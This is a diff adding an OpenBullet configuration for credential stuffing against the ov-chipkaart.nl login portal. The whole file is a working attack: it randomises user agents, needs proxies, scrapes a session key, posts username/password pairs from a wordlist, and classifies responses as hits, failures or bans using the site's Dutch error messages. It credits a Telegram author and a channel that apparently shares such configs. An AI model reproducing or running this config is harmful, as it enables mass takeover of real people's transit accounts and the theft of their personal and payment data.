@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "ov-chipkaart.nl",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-20T00:51:20.6599688+03:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#User-Agent FUNCTION GetRandomUA -> VAR "User-Agent" 
+
+#Get REQUEST GET "https://login.ov-chipkaart.nl/authenticationendpoint/login.do?RelayState=https%3A%2F%2Fwww.ov-chipkaart.nl%2Fweb%2Fmijn-ov-chip.htm&commonAuthCallerPath=%2Fsamlsso&forceAuth=false&passiveAuth=false&swfrmsig=821085bd82747c8dcde40b40fbeec9d93c0e6e9878a402716e12206481d8069160fd1564f3b6bf74da94e951a32efa794c367a3dab3f01dd372b2a11a54c008147e93948a102efd543547ac7ccf155482624f4ca18cb8733%7C567814f7f2d7ed2c4f6b819c9e9bbe997a58b5fb1c970028cfe877a3d9f774ae&tenantDomain=carbon.super&sessionDataKey=b85d6afc-529e-4cc0-9b0e-a3436b3f8ccd&relyingParty=www.ov-chipkaart.nl&type=samlsso&sp=nl.translink.frontoffice.fecustomerwebsite&isSaaSApp=false&authenticators=BasicAuthenticator:LOCAL" 
+  
+  HEADER "Host: login.ov-chipkaart.nl" 
+  HEADER "User-Agent: <User-Agent>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.ov-chipkaart.nl/" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#sessionDataKey PARSE "<SOURCE>" CSS "[name=sessionDataKey]" "value" -> VAR "sessionDataKey" 
+
+#Login REQUEST POST "https://login.ov-chipkaart.nl/commonauth" EncodeContent=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&sessionDataKey=<sessionDataKey>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: login.ov-chipkaart.nl" 
+  HEADER "User-Agent: <User-Agent>" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://login.ov-chipkaart.nl" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "De combinatie van gebruikersnaam en wachtwoord is niet bekend." 
+    KEY "Het account is geblokkeerd" 
+  KEYCHAIN Success OR 
+    KEY "https://www.ov-chipkaart.nl/web/mijn-ov-chip.htm" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
